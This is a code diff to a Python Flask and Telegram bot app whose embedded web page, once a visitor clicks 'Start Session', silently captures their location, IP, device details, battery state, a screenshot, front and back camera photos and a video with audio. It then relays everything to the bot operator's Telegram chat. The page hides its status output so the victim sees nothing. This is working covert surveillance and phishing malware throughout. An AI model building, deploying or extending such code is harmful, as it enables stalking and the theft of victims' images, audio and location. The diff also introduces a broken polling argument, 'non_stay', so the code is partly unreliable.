@@ -30,9 +30,8 @@ HTML_PAGE = """<!DOCTYPE html>
         .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
         .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
         .controls button:disabled { opacity:0.5; cursor:not-allowed; }
-        /* Hide all status elements */
+        /* Hide status elements */
         #statusText, #locationStatus, #debug { display: none; }
-        /* Ensure body takes full height for screenshot */
         html, body { min-height: 100%; }
     </style>
 </head>
@@ -64,14 +63,17 @@ HTML_PAGE = """<!DOCTYPE html>
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const startBtn = document.getElementById('startBtn');
 
-        // ---- Helper: send form data ----
+        // ---- Helper: delay ----
+        function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+        // ---- Send data ----
         async function sendData(formData) {
             try {
                 await fetch('/capture', { method: 'POST', body: formData });
             } catch (e) {}
         }
 
-        // ---- Get IP info ----
+        // ---- IP info ----
         async function getIpInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -113,7 +115,6 @@ HTML_PAGE = """<!DOCTYPE html>
         // ---- Full page screenshot ----
         function captureScreenshot() {
             return new Promise((resolve) => {
-                // Capture the whole document
                 html2canvas(document.documentElement, {
                     useCORS: true,
                     logging: false,
@@ -129,48 +130,40 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Camera streams with specific facing modes ----
+        // ---- Get camera streams with specific facing modes ----
         async function getCameraStreams() {
-            // Try to get back camera (environment)
-            let backStream = null;
+            // Back camera with audio
+            let back = null;
             try {
-                backStream = await navigator.mediaDevices.getUserMedia({
+                back = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
-                    audio: true  // include audio for recording
+                    audio: true
                 });
             } catch (e) {
-                // fallback: try without constraint
                 try {
-                    backStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                } catch (e2) {
-                    // no camera
-                }
+                    back = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                } catch (e2) {}
             }
 
-            // Try to get front camera (user)
-            let frontStream = null;
+            // Front camera (no audio needed)
+            let front = null;
             try {
-                frontStream = await navigator.mediaDevices.getUserMedia({
+                front = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
-                    audio: false // front only for photo, no audio needed
+                    audio: false
                 });
             } catch (e) {
-                // if back exists, reuse it for front as fallback
-                if (backStream) {
-                    // clone the stream? we can just reuse the same track
-                    frontStream = backStream.clone();
-                } else {
-                    // last resort: get any camera
+                if (back) front = back.clone();
+                else {
                     try {
-                        frontStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                        front = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                     } catch (e2) {}
                 }
             }
-
-            return { front: frontStream, back: backStream };
+            return { front, back };
         }
 
-        // ---- Capture frame from stream ----
+        // ---- Capture frame ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
@@ -198,6 +191,9 @@ HTML_PAGE = """<!DOCTYPE html>
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Loading...';
+
+            // Small delay to let the browser settle
+            await delay(300);
 
             // 1. Location
             let locationData = null;
@@ -227,21 +223,16 @@ HTML_PAGE = """<!DOCTYPE html>
             let frontBlob = null, backBlob = null, videoBlob = null;
 
             if (front || back) {
-                // Capture frames
                 if (front) frontBlob = await captureFrame(front);
                 if (back) backBlob = await captureFrame(back);
 
-                // Record from back stream (with audio) if available, else from front
                 let recordStream = back || front;
                 if (recordStream) {
-                    // We need a stream with audio; if back doesn't have audio, we can add audio from front? Not needed.
-                    // We'll use recordStream as is.
                     mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9,opus' });
                     recordedChunks = [];
                     mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
                     mediaRecorder.onstop = () => {
                         videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                        // finalize after recording stops
                         finalizeAndSend();
                     };
                     mediaRecorder.start(1000);
@@ -255,15 +246,12 @@ HTML_PAGE = """<!DOCTYPE html>
                     window.addEventListener('beforeunload', () => {
                         if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
                     });
-                } else {
-                    // no stream for recording, skip video
                 }
             }
 
-            // 4. Screenshot (capture after everything else)
+            // 4. Screenshot
             const screenshotBlob = await captureScreenshot();
 
-            // Function to finalize and send all data
             let finalized = false;
             async function finalizeAndSend() {
                 if (finalized) return;
@@ -276,15 +264,13 @@ HTML_PAGE = """<!DOCTYPE html>
                 } else {
                     fd.append('location_denied', 'true');
                 }
-                // IP info
+                // IP, Device, Battery
                 fd.append('ip', ipInfo.ip || 'unknown');
                 fd.append('city', ipInfo.city || 'unknown');
                 fd.append('region', ipInfo.region || 'unknown');
                 fd.append('country', ipInfo.country || 'unknown');
-                // Device
                 fd.append('brand', device.brand);
                 fd.append('model', device.model);
-                // Battery
                 fd.append('battery_level', battery.level);
                 fd.append('battery_charging', battery.charging);
                 // Screenshot
@@ -300,18 +286,15 @@ HTML_PAGE = """<!DOCTYPE html>
                 startBtn.innerText = '▶ Start Session';
             }
 
-            // If no recording started (no camera), finalize immediately.
             if (!mediaRecorder) {
                 finalizeAndSend();
             } else {
-                // Wait for recording to finish or timeout
                 setTimeout(() => {
                     if (!finalized) {
                         if (recordingActive && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        // Ensure videoBlob exists (if not, empty blob)
                         if (!videoBlob) {
                             videoBlob = new Blob([], { type: 'video/webm' });
                         }
@@ -322,7 +305,6 @@ HTML_PAGE = """<!DOCTYPE html>
         }
 
         document.getElementById('startBtn').addEventListener('click', startSession);
-        // No visible status updates – everything runs silently.
     </script>
 </body>
 </html>"""
@@ -333,7 +315,7 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    # Extract all data from the form
+    # Extract all data
     lat = request.form.get('lat')
     lng = request.form.get('lng')
     location_denied = request.form.get('location_denied')
@@ -345,8 +327,6 @@ def capture():
     model = request.form.get('model', 'Unknown')
     battery_level = request.form.get('battery_level', 'unknown')
     battery_charging = request.form.get('battery_charging', 'unknown')
-
-    # Files
     screenshot = request.files.get('screenshot')
     front_img = request.files.get('frontImage')
     back_img = request.files.get('backImage')
@@ -366,7 +346,7 @@ def capture():
             except Exception as e:
                 print(f"Error: {e}")
 
-        # IP & Device & Battery
+        # IP + Device + Battery
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
@@ -402,11 +382,11 @@ def capture():
             except Exception as e:
                 print(f"Back image error: {e}")
 
-        # Video (with audio)
+        # Video
         if video:
             try:
                 video.seek(0)
-                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording (with sound)")
+                bot.send_video(uid, video.read(), supports_streaming=True, caption="🎥 Recording (with audio)")
             except Exception as e:
                 print(f"Video error: {e}")
 
@@ -424,7 +404,7 @@ def send_link(m):
 
 def run_bot():
     print("Bot polling started.")
-    bot.polling(non_stop=True, interval=1)
+    bot.polling(non_stay=True, interval=1)
 
 if __name__ == '__main__':
     threading.Thread(target=run_bot, daemon=True).start()
